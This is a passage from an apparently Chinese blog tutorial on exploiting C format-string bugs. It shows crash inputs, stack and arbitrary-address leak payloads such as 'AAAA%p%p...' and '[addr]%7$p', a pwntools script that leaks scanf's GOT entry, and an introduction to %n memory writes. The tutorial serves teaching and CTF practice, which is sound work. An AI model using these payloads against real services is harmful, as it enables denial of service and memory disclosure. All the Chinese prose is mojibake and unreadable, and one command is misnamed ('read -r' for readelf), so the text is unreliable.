è¾“å‡ºäº†æ ˆä¸Šçš„å†…å®¹ï¼ŒæŸ¥çœ‹æ ˆä¸Šçš„å†…å®¹ã€‚</li></ul><h3 id="ç¨‹åºå´©æºƒ"><a href="#ç¨‹åºå´©æºƒ" class="headerlink" title="ç¨‹åºå´©æºƒ"></a>ç¨‹åºå´©æºƒ</h3><p>åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²è®©ç¨‹åºå´©æºƒå¾ˆç®€å•ï¼Œåªéœ€è¦å‘ç¨‹åºè¾“å…¥æ— æ•°ä¸ª%sã€‚å¯¹äºæ¯ä¸€ä¸ª%sï¼Œç¨‹åºéƒ½è¦è·å–ä¸€ä¸ªæ ˆä¸Šçš„æ•°å­—ï¼Œå¹¶æŠŠè¯¥æ•°å­—è§†ä½œä¸€ä¸ªåœ°å€ï¼Œç„¶åæ‰“å°å‡ºåœ°å€æŒ‡å‘çš„å†…å­˜å†…å®¹ï¼Œç›´åˆ°å‡ºç°NULLå­—ç¬¦ã€‚ä½†æ˜¯æ ˆä¸Šå¹¶ä¸æ˜¯æ¯ä¸€ä¸ªå€¼éƒ½å¯¹åº”ç€ä¸€ä¸ªåˆæ³•çš„åœ°å€ï¼Œæ€»ä¼šæœ‰ä¸€ä¸ªå¯¹åº”çš„å†…å­˜ä¸å­˜åœ¨ï¼Œå°±å¯ä»¥è®©ç¨‹åºå´©æºƒã€‚</p><p>æ¯”å¦‚ï¼š<code>printf(&quot;%s%s%s%s%s%s%s%s%s%s%s%s%s%s&quot;)</code></p><p>åˆ©ç”¨è¿™ä¸€æ¼æ´ï¼Œæˆ‘ä»¬è™½ç„¶ä¸èƒ½æ§åˆ¶ç¨‹åºï¼Œä½†æ˜¯å¯ä»¥è®©æœåŠ¡å´©æºƒï¼Œä½¿å¾—å…¶ä»–ç”¨æˆ·æ— æ³•è®¿é—®ã€‚</p><h3 id="æ³„éœ²å†…å­˜"><a href="#æ³„éœ²å†…å­˜" class="headerlink" title="æ³„éœ²å†…å­˜"></a>æ³„éœ²å†…å­˜</h3><h4 id="æ³„éœ²æ ˆå†…å­˜"><a href="#æ³„éœ²æ ˆå†…å­˜" class="headerlink" title="æ³„éœ²æ ˆå†…å­˜"></a>æ³„éœ²æ ˆå†…å­˜</h4><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ç¨‹åºå´©æºƒæ¥éªŒè¯æ¼æ´ï¼Œé™¤æ­¤ä¹‹å¤–æˆ‘ä»¬è¿˜æ˜¯è¦åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²è·å–æœ‰æ•ˆä¿¡æ¯ï¼Œä¸ºä¸‹ä¸€æ­¥çš„æ¼æ´åˆ©ç”¨åšå‡†å¤‡ã€‚</p><p>æˆ‘ä»¬å·²ç»çŸ¥é“æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°ä»æ ˆä¸Šå–å€¼ï¼Œå¹¶ä¸”åœ¨x86ä¸­å‚æ•°é€†åºï¼ˆä»å³åˆ°å·¦ï¼‰è¿›æ ˆï¼Œè€Œå¯¹äºprintfå‡½æ•°æ¥è¯´ï¼Œå®é™…å‚æ•°ä¹ŸæŒ‰ç…§é€†åºçš„é¡ºåºè¢«å‹å…¥æ ˆä¸­ï¼Œæ‰€ä»¥å‚æ•°åœ¨å†…å­˜ä¸­å‡ºç°çš„é¡ºåºå’Œprintfè°ƒç”¨æ—¶çš„é¡ºåºä¸€æ ·ã€‚</p><h5 id="æ³„éœ²æ ˆå˜é‡æ•°å€¼"><a href="#æ³„éœ²æ ˆå˜é‡æ•°å€¼" class="headerlink" title="æ³„éœ²æ ˆå˜é‡æ•°å€¼"></a>æ³„éœ²æ ˆå˜é‡æ•°å€¼</h5><p>ä¸¾ä¸ªæ —å­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">int</span> a = <span class="hljs-number">0xAAAAAAAA</span>;<br>    <span class="hljs-type">int</span> b = <span class="hljs-number">0xBBBBBBBB</span>;<br>    <span class="hljs-type">int</span> c = <span class="hljs-number">0xCCCCCCCC</span>;<br>    <span class="hljs-type">char</span> *str = <span class="hljs-string">&quot;%p %p %p\n&quot;</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p %p %p %s\n&quot;</span>, a, b, c, str);  <span class="hljs-comment">//è¾“å‡ºä¸‰ä¸ªæ•´å‹å˜é‡ï¼Œæ¥ç€è¾“å‡ºå­—ç¬¦ä¸² str</span><br>    <span class="hljs-built_in">printf</span>(str);  <span class="hljs-comment">//ç›´æ¥å°† str å­—ç¬¦ä¸²ä½œä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¾“å‡ºæ˜¯è¿™ä¸ªæ ·å­çš„</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/use1.png"></p><p>å¯ä»¥çœ‹åˆ°ç¬¬äºŒä¸ªprintå¤„è¾“å‡ºäº†ä¸¤ä¸ªåœ°å€ï¼Œåˆ†åˆ«çœ‹ä¸€ä¸‹ä¸¤ä¸ªprintfçš„æ ˆç»“æ„</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/example-stack.png"></p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/example-stack-2.png"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬åˆ©ç”¨è‡ªå·±å†™çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²èƒ½å¤ŸæŸ¥çœ‹æ ˆä¸Šçš„ä¿¡æ¯ã€‚</p><p>åƒä¾‹é¢˜è¿™æ ·çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°å†™æ³•ï¼Œæˆ‘ä»¬åªèƒ½æŒ‰é¡ºåºè·å–æ ˆä¸Šçš„å‚æ•°ã€‚æˆ‘ä»¬å¯ä»¥ç¨åŠ ä¿®æ”¹ï¼Œæ ¹æ®å‰é¢è®²åˆ°çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„æ ¼å¼ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡<code>%n$[type]</code>çš„æ–¹å¼æŸ¥çœ‹ç¬¬nä¸ªå‚æ•°çš„å€¼</p><p>ä¸¾ä¸ªæ —å­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> a = <span class="hljs-number">0xAAAAAAAA</span>;<br>    <span class="hljs-type">int</span> b = <span class="hljs-number">0xBBBBBBBB</span>;<br>    <span class="hljs-type">int</span> c = <span class="hljs-number">0xCCCCCCCC</span>;<br>    <span class="hljs-type">char</span> str[<span class="hljs-number">200</span>];<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>,str);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p %p %p %s\n&quot;</span>, a, b, c, str);<br>    <span class="hljs-built_in">printf</span>(str);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬åœ¨å¼€å§‹è¾“å…¥%3$xï¼ŒæŸ¥çœ‹ç¬¬äºŒä¸ªprintfå¤„çš„æ ˆç»“æ„</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/example2-stack.png"></p><p>æŸ¥çœ‹è¾“å‡ºç»“æœï¼Œprintfè¾“å‡ºäº†ç¬¬3+1ä¸ªå‚æ•°å¯¹åº”çš„å€¼</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/example2-output.png"></p><h5 id="è·å–æ ˆå˜é‡å¯¹åº”å­—ç¬¦ä¸²"><a href="#è·å–æ ˆå˜é‡å¯¹åº”å­—ç¬¦ä¸²" class="headerlink" title="è·å–æ ˆå˜é‡å¯¹åº”å­—ç¬¦ä¸²"></a>è·å–æ ˆå˜é‡å¯¹åº”å­—ç¬¦ä¸²</h5><p>è¿˜æ˜¯ç”¨ä¸Šé¢çš„é‚£ä¸ªç¨‹åºï¼Œè¿™æ¬¡è¾“å…¥<code>$s</code>æ¥è¯•ä¸€ä¸‹</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/example-s-outputandstack.png"></p><p>åœ¨ç¬¬äºŒæ¬¡ printf å¤„ï¼Œç¨‹åºå°† 0xffffcfe4 å¤„çš„å˜é‡è§†ä¸ºå­—ç¬¦ä¸²å˜é‡ï¼Œè¾“å‡ºäº†å…¶æ•°å€¼æ‰€å¯¹åº”çš„åœ°å€å¤„çš„å­—ç¬¦ä¸²ã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¹¶ä¸æ˜¯æ‰€æœ‰è¿™æ ·çš„éƒ½ä¼šæ­£å¸¸è¿è¡Œï¼Œ<strong>å¦‚æœå¯¹åº”çš„å˜é‡ä¸èƒ½å¤Ÿè¢«è§£æä¸ºå­—ç¬¦ä¸²åœ°å€ï¼Œç¨‹åºå°±ä¼šç›´æ¥å´©æºƒ</strong>ã€‚</p><p>æˆ‘ä»¬å°è¯•è¾“å…¥ <code>%4$s</code>ï¼Œå°±ä¼šæŠ¥é”™ç›´æ¥å´©æºƒã€‚</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/example-s-error.png"></p><h5 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h5><ul><li><p>å¯ä»¥åˆ©ç”¨ <code>%x</code> æˆ–è€… <code>%p</code> æ¥è·å–ç›¸åº”æ ˆä¸Šçš„å†…å­˜ï¼ŒåŒºåˆ«æ˜¯è¾“å‡ºçš„ä¿¡æ¯æ˜¯å¦åŒ…å«å‰ç¼€â€0xâ€ï¼ˆ <code>%p</code> ä¼šè‡ªåŠ¨æ·»åŠ å‰ç¼€â€0xâ€ï¼Œè€Œ <code>%x</code> ä¸ä¼šï¼‰</p></li><li><p>åˆ©ç”¨ <code>%s</code> æ¥è·å–å˜é‡æ‰€å¯¹åº”åœ°å€çš„å†…å®¹ï¼Œä½†éœ€è¦æ³¨æ„å­—ç¬¦ä¸²ä»¥é›¶å­—ç¬¦ï¼ˆâ€™\0â€™ï¼‰ä½œä¸ºç»“å°¾ã€‚è¯¥åœ°å€ä¸Šå­˜å‚¨çš„æ•°æ®å¯èƒ½ä¼šè¢«æˆªæ–­ï¼Œåªä¼šè¾“å‡ºåˆ°é‡åˆ°ç¬¬ä¸€ä¸ªé›¶å­—ç¬¦ä¸ºæ­¢ã€‚</p></li><li><p>åˆ©ç”¨ <code>% [n]$x</code> æ¥è·å–æŒ‡å®šå‚æ•°çš„å€¼ï¼Œåˆ©ç”¨ <code>%[n]$s</code> æ¥è·å–æŒ‡å®šå‚æ•°å¯¹åº”åœ°å€å†…å®¹ã€‚</p></li></ul><h4 id="æ³„éœ²ä»»æ„åœ°å€å†…å­˜"><a href="#æ³„éœ²ä»»æ„åœ°å€å†…å­˜" class="headerlink" title="æ³„éœ²ä»»æ„åœ°å€å†…å­˜"></a>æ³„éœ²ä»»æ„åœ°å€å†…å­˜</h4><p>æˆ‘ä»¬åœ¨åšé¢˜çš„æ—¶å€™ç»å¸¸ä¼šéœ€è¦æ³„éœ²æŸä¸€ä¸ª libc å‡½æ•°çš„ got è¡¨å†…å®¹ï¼Œä»è€Œå¾—åˆ°å…¶åœ°å€ï¼Œè¿›è€Œè·å– libc ç‰ˆæœ¬ä»¥åŠå…¶ä»–å‡½æ•°çš„åœ°å€ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±éœ€è¦æ§åˆ¶æ³„éœ²æŸä¸€ä¸ªåœ°å€çš„å†…å­˜ã€‚</p><p>ä¸€èˆ¬æ¥è¯´ï¼Œåœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ä¸­ï¼Œæˆ‘ä»¬æ‰€è¯»å–çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²éƒ½æ˜¯åœ¨æ ˆä¸Šçš„ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œè°ƒç”¨è¾“å‡ºå‡½æ•°çš„æ—¶å€™æˆ‘ä»¬çš„<strong>ç¬¬ä¸€ä¸ªå‚æ•°å€¼å°±æ˜¯è¿™ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åœ°å€</strong>ã€‚</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/example-s-outputandstack.png"></p><p>åœ¨æˆ‘ä»¬ä¸Šé¢è¾“å‡ºå­—ç¬¦ä¸²çš„ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹å‡ºæ ˆä¸Šçš„ç¬¬äºŒä¸ªå˜é‡å°±æ˜¯æˆ‘ä»¬çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²åœ°å€ 0xffffcFE0ï¼ŒåŒæ—¶è¯¥åœ°å€å­˜å‚¨çš„ä¹Ÿæ˜¯ â€œ%sâ€ æ ¼å¼åŒ–å­—ç¬¦ä¸²å†…å®¹ã€‚</p><p>é‚£å¦‚æœæˆ‘ä»¬çŸ¥é“æŸä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²åœ¨è¾“å‡ºçš„æ—¶å€™è°ƒç”¨çš„æ˜¯ç¬¬å‡ ä¸ªå‚æ•°ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ä¸‹é¢çš„æ–¹æ³•è·å–æŸä¸ªæŒ‡å®šåœ°å€çš„å†…å®¹ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">[addr]%[k]$s<br></code></pre></td></tr></table></figure><h5 id="ç¡®å®šç›¸å¯¹åç§»"><a href="#ç¡®å®šç›¸å¯¹åç§»" class="headerlink" title="ç¡®å®šç›¸å¯¹åç§»"></a>ç¡®å®šç›¸å¯¹åç§»</h5><p>é‚£ä¹ˆå¦‚ä½•ç¡®å®šè¯¥æ ¼å¼åŒ–å­—ç¬¦ä¸²æ˜¯ç¬¬å‡ ä¸ªå‚æ•°å‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥å‘ç¨‹åºå‘é€å¦‚ä¸‹æ ¼å¼çš„payloadï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">[tag]%p%p%p%p%p%p%p%p%p%p%p%p%p%p<br></code></pre></td></tr></table></figure><p>å…¶ä¸­ <code>[tag]</code> æ˜¯æˆ‘ä»¬åˆ¤æ–­çš„æ ‡å¿—ï¼Œæˆ‘ä»¬ä¸€èˆ¬ä¼šé€‰æ‹©é‡å¤æŸä¸€ä¸ªå­—ç¬¦çš„æœºå™¨å­—é•¿ä½œä¸º tag ï¼Œæ¯”å¦‚ â€˜AAAAâ€™ã€‚å¦‚æœè¾“å‡ºçš„æ ˆä¸Šçš„å†…å®¹å’Œæˆ‘ä»¬çš„ tag é‡å¤äº†ï¼Œé‚£ä¹ˆè¿™ä¸ªåœ°å€å¤§æ¦‚ç‡å°±æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åœ°å€ï¼Œå¯ä»¥æ›´æ¢å¤šä¸ª tag å†æ¬¡ç¡®è®¤å°è¯•ã€‚</p><p>è¿˜æ˜¯ä¹‹å‰çš„ç¨‹åºï¼Œæˆ‘ä»¬è¾“å…¥<code>AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p</code>æ¥æµ‹è¯•ä¸€ä¸‹</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/show-add-output.png"></p><p>å…¶ä¸­ç¬¬äºŒæ¬¡ printf è¾“å‡ºå¦‚ä¸‹ï¼ˆä¸ºäº†æ–¹ä¾¿çœ‹ï¼Œæˆ‘åœ¨æ¯ä¸¤ä¸ªåœ°å€ä¹‹é—´åŠ äº†ç©ºæ ¼ï¼‰ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">AAAA</span> <span class="hljs-number">0</span>xffffcffc <span class="hljs-number">0</span>xf7de0012 <span class="hljs-number">0</span>x80484a0 <span class="hljs-number">0</span>xf63d4e2e <span class="hljs-number">0</span>x804825c <span class="hljs-number">0</span>x7b1ea71 <span class="hljs-number">0</span>x41414141 <span class="hljs-number">0</span>x70257025 <span class="hljs-number">0</span>x70257025 <span class="hljs-number">0</span>x70257025 <span class="hljs-number">0</span>x70257025<br></code></pre></td></tr></table></figure><p>ç”± 0x41414141 å¤„æ‰€åœ¨çš„ä½ç½®å¯ä»¥çœ‹å‡ºæˆ‘ä»¬çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„èµ·å§‹åœ°å€æ­£å¥½æ˜¯è¾“å‡ºå‡½æ•°çš„ç¬¬8ä¸ªå‚æ•°ï¼Œæ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ç¬¬7ä¸ªå‚æ•°ã€‚æˆ‘ä»¬å¯ä»¥æ¥æµ‹è¯•ä¸€ä¸‹ï¼Œå†ä¸€æ¬¡è¾“å…¥ <code>%7$p</code>å³å¯è¯»å‡ºè¿™é‡Œçš„å†…å®¹ã€‚å¦‚æœè¿™æ˜¯ä¸ªä¸åˆæ³•çš„åœ°å€ï¼Œç¨‹åºå°†ä¼šå´©æºƒã€‚</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/show-add-output2.png"></p><p>å½“ç„¶ä¼šè¿™ä¸ªä¹Ÿæ²¡æœ‰ä»€ä¹ˆç”¨ï¼ˆx</p><h5 id="ç¡®å®šåˆ©ç”¨çš„å‡½æ•°"><a href="#ç¡®å®šåˆ©ç”¨çš„å‡½æ•°" class="headerlink" title="ç¡®å®šåˆ©ç”¨çš„å‡½æ•°"></a>ç¡®å®šåˆ©ç”¨çš„å‡½æ•°</h5><p>å°±åƒå‰é¢è¯´çš„ï¼Œæˆ‘ä»¬çœŸæ­£ç»å¸¸ç”¨åˆ°æ˜¯æŠŠç¨‹åºä¸­æŸå‡½æ•°çš„ GOT åœ°å€ä¼ è¿›å»ï¼Œç„¶åè·å¾—è¯¥åœ°å€æ‰€å¯¹åº”çš„å‡½æ•°çš„è™šæ‹Ÿåœ°å€ï¼Œæœ€åæ ¹æ®å‡½æ•°åœ¨ libc ä¸­çš„ç›¸å¯¹ä½ç½®ï¼Œè®¡ç®—å‡ºæˆ‘ä»¬éœ€è¦çš„å‡½æ•°åœ°å€ã€‚</p><p>è¿˜æ˜¯ç”¨ä¸Šé¢çš„ä¾‹å­ï¼Œæˆ‘ä»¬è¾“å…¥ä¸€ä¸ªå¯è®¿é—®çš„åœ°å€ï¼Œæ¯”å¦‚<code>scanf@got</code>ï¼Œå°±åº”è¯¥è¾“å‡ºscanfå¯¹åº”çš„åœ°å€ã€‚</p><p>æˆ‘ä»¬é¦–å…ˆä½¿ç”¨ <code>read -r test</code> å‘½ä»¤æŸ¥çœ‹å…¶é‡å®šå‘è¡¨ï¼š</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/got.png"></p><blockquote><p>è¿™é‡Œä¹‹æ‰€ä»¥æ²¡æœ‰ä½¿ç”¨ printf å‡½æ•°ï¼Œæ˜¯å› ä¸º scanf å‡½æ•°ä¼šè¿‡æ»¤æ‰ä¸€äº›å­—ç¬¦ï¼Œå°±åƒ â€˜\x0câ€™ (â€˜\fâ€™) ã€â€™â€™\x07â€™ (\aâ€™) ã€â€™\x08â€™ (â€™\bâ€™) ã€â€™\x20â€™ (SPACE)ç­‰çš„ä¸å¯è§å­—ç¬¦éƒ½ä¼šè¢«çœç•¥ã€‚</p></blockquote><p>ç›´æ¥ç”¨pwntoolså†™ä¸ªexpï¼ŒæŠŠè·å–gotè¡¨åœ°å€å†™åœ¨é‡Œé¢</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=process(<span class="hljs-string">&#x27;./test&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./test&quot;</span>)<br><br>scanf_got = elf.got[<span class="hljs-string">&#x27;scanf&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(scanf_got))    <br><br>payload=p32(scanf_got)+<span class="hljs-string">b&#x27;%7$p&#x27;</span><br>gdb.attach(p,<span class="hljs-string">&quot;break printf&quot;</span>)<br>p.sendline(payload)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(u32(p.recv()[<span class="hljs-number">4</span>:<span class="hljs-number">8</span>]))<br>p.interactive()<br></code></pre></td></tr></table></figure><p>æœ€ç»ˆçš„è¾“å‡ºå’Œgdbæ ˆç»“æ„å¦‚ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬æ‰“å°è¾“å‡ºçš„ç¡®å®æ˜¯scanfçš„åœ°å€</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/exp.png"></p><h5 id="å°ç»“-1"><a href="#å°ç»“-1" class="headerlink" title="å°ç»“"></a>å°ç»“</h5><ul><li>é¦–å…ˆç¡®å®šè¦æ³„éœ²çš„å‚æ•°çš„ç›¸å¯¹åç§»</li><li>ç¡®å®šè¦åˆ©ç”¨çš„å‡½æ•°</li><li>è¿›è¡Œæ³„éœ²</li></ul><h3 id="è¦†ç›–å†…å­˜"><a href="#è¦†ç›–å†…å­˜" class="headerlink" title="è¦†ç›–å†…å­˜"></a>è¦†ç›–å†…å­˜</h3><h4 id="è¦†ç›–æ ˆå†…å­˜"><a href="#è¦†ç›–æ ˆå†…å­˜" class="headerlink" title="è¦†ç›–æ ˆå†…å­˜"></a>è¦†ç›–æ ˆå†…å­˜</h4><p>åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„å¤šç§ç±»å‹ä¸­ï¼Œæœ‰ä¸€ä¸ªç¥ç§˜çš„ <code>%n</code>Â·Â·Â·Â·Â·Â·ï¼ˆx </p><p><strong><code>%n</code> ä¸è¾“å‡ºå­—ç¬¦ï¼Œä½†æ˜¯æŠŠå·²ç»æˆåŠŸå†™å…¥æµæˆ–ç¼“å†²åŒºä¸­çš„å­—ç¬¦ä¸ªæ•°å†™å…¥å¯¹åº”çš„æ•´å‹æŒ‡é’ˆå‚æ•°æ‰€æŒ‡çš„å˜é‡ã€‚</strong></p><p>ä¸¾ä¸ªæ —å­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> num;<br>    <span class="hljs-type">char</span> *str = <span class="hljs-string">&quot;Hello Modifier&quot;</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s %n\n&quot;</span>, str, &amp;num);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, num);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">//è¾“å‡ºä¸º</span><br>Hello Modifier<br><span class="hljs-number">15</span>    <span class="hljs-comment">//&#x27;Hello Modifier&#x27;+&quot;%s %n&quot;ä¸­é—´çš„ç©ºæ ¼ = 15</span><br></code></pre></td></tr></table></figure><p>é€šå¸¸æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬è¦éœ€è¦è¦†å†™çš„å€¼æ˜¯ä¸€ä¸ª shellcode çš„åœ°å€ï¼Œè€Œè¿™ä¸ªåœ°å€å¾€å¾€æ˜¯ä¸€ä¸ªå¾ˆå¤§çš„æ•°å­—ã€‚è¿™æ—¶æˆ‘ä»¬å°±éœ€è¦é€šè¿‡ä½¿ç”¨å…·ä½“çš„å®½åº¦æˆ–ç²¾åº¦çš„è½¬æ¢è§„èŒƒæ¥æ§åˆ¶å†™å…¥çš„å­—ç¬¦ä¸ªæ•°ï¼ˆå¿«å»å¤ä¹ ä¸€ä¸‹æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„æ ¼å¼ï¼‰ã€‚</p><p>ä¸¾ä¸ªæ —å­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> num;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%010u%n\n&quot;</span>, <span class="hljs-number">1</span>, &amp;num);  <span class="hljs-comment">//%010u è¾“å‡ºåŸŸå®½ä¸º10çš„åè¿›åˆ¶æ•´å‹æ•°å­—ï¼Œä¸è¶³çš„ä½æ•°åœ¨å·¦ä¾§ç”¨0è¡¥é½</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;num is %d\n&quot;</span>, num);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">//è¾“å‡ºä¸º</span><br><span class="hljs-number">0000000001</span><br>num is <span class="hljs-number">10</span><br></code></pre></td></tr></table></figure><p>åŒç†æˆ‘ä»¬å¯ä»¥å°†ä¸€ä¸ªåå…­è¿›åˆ¶çš„åœ°å€è¿›è¡Œé€‚å½“çš„è½¬æ¢ï¼Œåˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²å†™å…¥å†…å­˜ã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬ä¸èƒ½ç›´æ¥è½¬æ¢ä¸ºä¸€ä¸ªå ä½å¾ˆå¤§çš„åè¿›åˆ¶è¿›è¡Œç¼–å†™ï¼Œå¦‚æœå ä½ç¬¦çš„é•¿åº¦è¶…å‡ºäº†<code>int</code>ç±»å‹çš„èŒƒå›´ï¼Œè¿™å°†å¯¼è‡´æœªå®šä¹‰çš„è¡Œä¸ºã€‚ä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªè¦†ç›–ä¸ä¸€å®šä¼šæˆåŠŸï¼ŒæˆåŠŸä¸å¦å–å†³äºä¸åŒçš„ç¼–è¯‘å™¨å’Œä¸åŒçš„å¹³å°ã€‚</p><p>æ¥ä¸‹æ¥éƒ½ç”¨ä¸‹é¢çš„ç¨‹åºè¿›è¡Œç›¸åº”çš„å­¦ä¹ ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 